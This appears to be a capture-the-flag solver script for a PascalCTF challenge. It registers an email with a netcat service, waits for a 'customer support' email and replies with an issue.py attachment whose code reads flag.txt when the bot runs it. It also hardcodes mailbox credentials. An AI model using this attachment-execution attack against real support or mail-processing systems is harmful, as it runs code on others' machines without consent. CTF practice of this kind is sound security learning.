#!/usr/bin/env python3
"""
SurgoCompany CTF Challenge Solver - No pwntools version
"""

import smtplib
import imaplib
import email
import time
import socket
import re
from email.message import EmailMessage

IMAP_SERVER = "mail.skillissue.it"
SMTP_SERVER = "mail.skillissue.it"
NC_HOST = "surgobot.ctf.pascalctf.it"
NC_PORT = 6005

PAYLOAD = 'print(open("flag.txt").read())'

USERNAME = "user-fbs0i4ds@skillissue.it"
PASSWORD = "Qul5wCjVWwsefYxj"

def get_email_from_service(username, password):
    """Poll inbox for the support email and extract the subject."""
    print("[*] Connecting to IMAP server...")
    mail = imaplib.IMAP4_SSL(IMAP_SERVER)
    mail.login(username, password)

    print("[*] Waiting for support email...")
    for i in range(30):
        mail.select('inbox')
        _, data = mail.search(None, 'UNSEEN')

        if data[0]:
            email_ids = data[0].split()
            for eid in email_ids:
                _, msg_data = mail.fetch(eid, '(RFC822)')
                msg = email.message_from_bytes(msg_data[0][1])
                subject = msg.get("Subject", "")
                from_addr = msg.get("From", "")
                if "Surgo Company Customer Support" in subject:
                    print(f"[+] Received email: {subject}")
                    print(f"[+] From: {from_addr}")
                    mail.store(eid, '+FLAGS', '\\Seen')
                    mail.close()
                    mail.logout()
                    return subject, from_addr
        print(f"[*] Waiting... ({i+1}/30)")
        time.sleep(2)

    mail.close()
    mail.logout()
    return None, None


def send_reply(username, password, subject, to_addr):
    """Send reply with malicious payload attachment."""
    print(f"[*] Sending reply with payload to {to_addr}...")

    # Extract just the email from "Name <email>" format
    if '<' in to_addr:
        to_addr = to_addr.split('<')[1].split('>')[0]

    msg = EmailMessage()
    msg['From'] = username
    msg['To'] = to_addr
    msg['Subject'] = f"Re: {subject}"
    msg.set_content("Please check the attached file for my issue.")

    # Add payload as attachment
    msg.add_attachment(
        PAYLOAD.encode(),
        maintype='text',
        subtype='plain',
        filename='issue.py'
    )

    with smtplib.SMTP_SSL(SMTP_SERVER, 465) as smtp:
        smtp.login(username, password)
        smtp.send_message(msg)

    print("[+] Reply sent with payload!")


def main():
    print(f"\n[*] Using email: {USERNAME}")

    # Step 1: Connect to the nc service
    print(f"\n[*] Connecting to {NC_HOST}:{NC_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(120)
    sock.connect((NC_HOST, NC_PORT))

    # Receive banner
    data = b""
    while b"Enter your email address:" not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        print(chunk.decode(), end='')

    # Send email
    sock.sendall((USERNAME + "\n").encode())
    print(f"\n[+] Sent email: {USERNAME}")

    # Wait for confirmation
    time.sleep(2)
    try:
        response = sock.recv(4096).decode()
        print(response)
    except:
        pass

    # Step 2: Wait for and receive the support email
    time.sleep(3)
    subject, from_addr = get_email_from_service(USERNAME, PASSWORD)

    if not subject:
        print("[-] Failed to receive support email!")
        sock.close()
        return

    # Step 3: Send reply with payload
    send_reply(USERNAME, PASSWORD, subject, from_addr)

    # Step 4: Receive the flag from nc connection
    print("\n[*] Waiting for flag output...")

    try:
        sock.settimeout(60)
        output = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
                print(chunk.decode(), end='')
            except socket.timeout:
                break

        output_str = output.decode()
        print("\n" + "="*50)

        # Try to extract flag
        flag_match = re.search(r'PascalCTF\{[^}]+\}', output_str)
        if flag_match:
            print(f"\n[+] FLAG: {flag_match.group()}")
    except Exception as e:
        print(f"[-] Error receiving output: {e}")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
